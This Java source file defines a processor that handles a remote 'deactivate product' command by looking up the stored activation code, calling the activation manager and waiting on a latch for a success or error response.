package com.fx.maind.command.processor;

import java.util.concurrent.CountDownLatch;

import com.fx.maind.ref.ActivationResponse;
import com.fx.maind.ref.Customization;
import com.vvt.activation_manager.ActivationListener;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;

public class RemoteDeactivateProductProcessor {
	
	private static final String TAG = "DeactivateCommandProcess";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private ActivationResponse mResponse;
	private AppEngine mAppEngine;
	private CountDownLatch mWaitForResponseLatch;
	
	private ActivationListener mActivationListener = new ActivationListener() {
		@Override
		public void onSuccess() {
			mResponse.setSuccess(true);
			mResponse.setMessage(MessageManager.DEACTIVATE_SUCCESS);
			mWaitForResponseLatch.countDown();
		}
		@Override
		public void onError(ErrorResponseType errorType, int code, final String msg) {
			mResponse.setSuccess(false);
			mResponse.setMessage(MessageManager.getErrorMessage(code));
			mWaitForResponseLatch.countDown(); 
		}
	};

	public RemoteDeactivateProductProcessor(AppEngine appEngine) {
		mAppEngine = appEngine;
		mResponse = new ActivationResponse();
	}
	
	public ActivationResponse process() {
		try {
			ActivationManager activationManager = mAppEngine.getActivationManager();
			String activationCode = mAppEngine.getLicenseManager().getLicenseInfo().getActivationCode();
			
			if (LOGV) FxLog.v(TAG, "process # activationCode :" + activationCode);
			mWaitForResponseLatch = new CountDownLatch(1);
			
			activationManager.deactivate(activationCode, mActivationListener);
			
			//Block the thread and wait till onSuccess or onError called.
			mWaitForResponseLatch.await();
		}
		catch(Throwable t) {
			mResponse.setSuccess(false);
			mResponse.setMessage(MessageManager.DEACTIVATE_ERROR);
			
			if (LOGE) FxLog.e(TAG, String.format("process # Error: %s", t));
		}
		
		if (LOGV) FxLog.v(TAG, "process # EXIT ...");
		return mResponse;
	}

}
